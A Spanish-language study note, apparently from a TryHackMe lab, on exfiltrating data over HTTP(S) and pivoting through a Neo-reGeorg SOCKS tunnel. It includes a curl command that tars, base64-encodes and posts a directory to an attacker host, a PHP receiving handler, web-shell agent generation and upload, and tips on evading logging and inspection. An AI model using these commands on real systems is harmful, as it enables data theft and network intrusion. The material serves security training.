---
tags: [red-team, data-exfiltration, http, https, tunneling, neo-regeorg]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[Data Exfiltration Concepts]]"
  - "[[Exfiltration over DNS]]"
  - "[[DNS Tunneling]]"
---

# Exfiltración por HTTP(S) y Tunneling

> [!abstract] TL;DR
> Transferir datos mediante peticiones web (HTTP POST). Dado que el tráfico web es universal, rara vez se bloquea en redes corporativas, haciéndolo ideal para mezclarse con la actividad normal. Si se añade cifrado (HTTPS), la inspección profunda (DPI) queda inhabilitada sin un proxy MitM corporativo. Adicionalmente, herramientas como Neo-reGeorg permiten pivotar creando un túnel SOCKS sobre este protocolo.

## Cuándo usarlo

La exfiltración por HTTP/HTTPS es el **estándar de oro** en operaciones Red Team porque:
- Prácticamente todas las redes permiten tráfico saliente hacia los puertos 80 y 443.
- Genera un volumen de tráfico que pasa desapercibido entre la navegación normal de los usuarios.
- Es soportado por cualquier lenguaje o herramienta nativa del SO (curl, wget, PowerShell).

## ¿Por qué POST y no GET?

Cuando enviamos datos a un servidor web, el atacante tiene dos métodos principales: GET y POST.

**Nunca usar GET para exfiltrar datos sensibles** si se puede evitar.
- **GET**: Los parámetros viajan en la URL (ej. `/script.php?data=UGFzc3dvcmQxMjM=`). Esta URL queda **registrada íntegramente** en los logs del servidor web (`access.log`), en proxies intermedios, historial del navegador e incluso puede ser cacheada.
- **POST**: Los datos viajan en el *cuerpo* (body) de la petición HTTP. Los logs estándar **no registran** el cuerpo del POST, solo la ruta destino. Además, no tiene límite estricto de tamaño.

## Método 1: Exfiltración simple vía POST

### Flujo de la técnica

```
┌─────────────┐                                      ┌─────────────┐
│   VÍCTIMA   │                                      │   ATACANTE  │
│             │                                      │             │
│  tar zcf -  │          HTTP POST Request           │  Web Server │
│    │        │         (Body: file=base64)          │    (PHP/PY) │
│  base64     ┼──────────────────────────────────────┼▶ handler.php│
│    │        │                                      │      │      │
│  curl --data│                                      │  Escribe a  │
└─────────────┘                                      │    disco    │
                                                     └─────────────┘
```

### Handler PHP del atacante

El atacante levanta un servidor web con un script simple que toma lo que llegue por POST y lo guarda en un archivo.

```php
<?php
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?>
```

### Envío desde la víctima con `curl`

Se empaqueta el directorio objetivo, se codifica en Base64 para que pueda viajar como texto en HTTP, y se envía como un campo de formulario web.

```shell
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

### Reparación del Base64 (El problema del URL-Encoding)

Cuando enviamos datos vía `curl --data`, por defecto se codifican como formulario web (`application/x-www-form-urlencoded`). En este formato, el signo más (`+`), que es válido y común en Base64, se interpreta como un **espacio en blanco**.

Al recibirlo, el Base64 estará corrupto porque sus `+` son ahora espacios. En la máquina del atacante hay que revertir esto antes de decodificar:

```shell
# 1. Reemplazar espacios por signos +
sudo sed -i 's/ /+/g' /tmp/http.bs64

# 2. Decodificar y extraer el directorio
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```

> [!tip] HTTPS
> Si el atacante expone su handler por el puerto 443 con un certificado SSL válido, el payload viajará 100% cifrado. Sin un proxy corporativo haciendo interceptación SSL, el Blue Team sólo verá una conexión hacia la IP del atacante, pero no sabrá qué se transfirió.

---

## Método 2: HTTP Tunneling con Neo-reGeorg

Existen escenarios donde un servidor web interno **no puede alcanzar directamente** a otras máquinas, pero nosotros sí tenemos acceso al servidor web desde afuera (DMZ).

**Neo-reGeorg** permite crear un túnel dinámico (SOCKS) **encapsulando el tráfico de red dentro de peticiones HTTP** dirigidas a un script que hemos logrado subir al servidor vulnerable.

### Flujo del Túnel SOCKS sobre HTTP

```
┌─────────────┐        HTTP(S)               ┌─────────────┐      Acceso      ┌─────────────┐
│  ATACANTE   │ ◀══════════════════════════▶ │  SERVIDOR   │ ◀══════════════▶ │    HOST     │
│             │   peticiones continuas a     │  COMPROM.   │   Tráfico puro   │  INTERNO    │
│ Proxy Local │        tunnel.php            │  (DMZ)      │                  │ (Base de    │
│(127.0.0.1:  │                              │             │                  │  datos, SMB)│
│       1080) │                              └─────────────┘                  └─────────────┘
└─────────────┘
```

1. Configuramos proxychains para usar el puerto `1080`.
2. Lanzamos `nmap` contra la Base de Datos interna a través de proxychains.
3. El tráfico de `nmap` entra a nuestro puerto `1080`.
4. El cliente Neo-reGeorg envuelve esos paquetes TCP en peticiones HTTP POST dirigidas a `tunnel.php`.
5. El servidor web procesa `tunnel.php`, extrae el TCP, y lo reenvía a la Base de Datos interna.

### 1. Generar el agente cifrado (Atacante)

Generamos los scripts web que actúan como puente.

```shell
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k mi_clave_secreta
```

Esto crea una carpeta `neoreg_servers/` con variantes para múltiples lenguajes (`tunnel.php`, `tunnel.aspx`, `tunnel.jsp`, etc.).

### 2. Subir el agente (Víctima / Servidor Web)

Subimos el script correspondiente (ej. `tunnel.php`) al servidor comprometido que queremos usar como pivote. Asumimos que queda accesible en: `http://MACHINE_IP/uploader/files/tunnel.php`

### 3. Conectar el cliente y levantar el túnel (Atacante)

Arrancamos la herramienta apuntando a la URL del agente. Neo-reGeorg abrirá un proxy SOCKS local por defecto en `127.0.0.1:1080`.

```shell
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k mi_clave_secreta -u http://MACHINE_IP/uploader/files/tunnel.php
```

### 4. Usar el túnel para pivotar (Atacante)

Ahora cualquier tráfico enviado a través de proxychains a ese puerto, viajará sobre HTTP hacia el servidor pivot y de ahí hacia el interior de la red.

```shell
# Usando curl soportando socks5
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80

# O usando proxychains para otras herramientas (nmap, ssh, etc.)
proxychains nmap -p 80,445 172.20.0.121
```

## Comandos Clave

```shell
# Envío POST con curl
curl --data "file=$(tar zcf - <dir> | base64)" http://attacker/contact.php

# Reparar base64 roto por url-encoding (atacante)
sed -i 's/ /+/g' file.bs64
cat file.bs64 | base64 -d | tar xvfz -

# HTTP Tunneling con Neo-reGeorg
python3 neoreg.py generate -k <key>
python3 neoreg.py -k <key> -u http://victim/tunnel.php
curl --socks5 127.0.0.1:1080 http://internal_target
```

## Preguntas y Respuestas

- **Chequea el `access.log` en `web.thm.com` y obtené la flag.**
  → Decodificar con `base64 -d` el valor del parámetro `file` en la entrada GET que aparece en el log. (Refuerza por qué **no** se debe usar GET).
- **Al visitar `http://flag.thm.com/flag` a través del túnel HTTP por la máquina uploader, ¿cuál es la flag?**
  → Se obtiene haciendo `curl --socks5 127.0.0.1:1080 http://flag.thm.com/flag` una vez establecido Neo-reGeorg.